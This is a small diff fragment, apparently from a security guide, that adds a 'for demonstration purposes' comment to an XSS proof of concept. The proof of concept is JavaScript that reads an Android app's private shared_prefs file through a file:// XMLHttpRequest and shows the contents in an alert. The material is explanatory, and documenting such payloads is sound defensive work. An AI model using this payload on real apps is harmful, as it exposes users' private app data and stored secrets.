@@ -825,7 +825,7 @@ Arbitrary file read using a cross-site scripting (XSS):
     xhr.open("GET", "file:///data/data/com.someapp.dev/shared_prefs/somefile.xml", true); // async
     xhr.onreadystatechange = function() {
         if (xhr.readyState == XMLHttpRequest.DONE) {
-            alert(xhr.responseText);
+            alert(xhr.responseText); // for demonstration purposes
         }
     }
     xhr.send();
